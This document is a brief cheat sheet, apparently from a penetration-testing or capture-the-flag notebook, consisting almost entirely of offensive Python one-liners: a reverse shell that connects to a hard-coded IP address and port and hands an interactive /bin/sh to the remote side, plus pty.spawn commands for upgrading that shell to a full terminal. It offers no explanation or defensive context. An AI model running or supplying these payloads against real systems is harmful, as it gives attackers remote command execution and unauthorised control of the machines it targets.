python

Reverse Shell

~~~python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.7.30",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
~~~

TTY Support for Linux

~~~python
python -c "import pty;pty.spawn('/bin/bash')"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~python
python3 -c "import pty;pty.spawn('/bin/bash')"
~~~

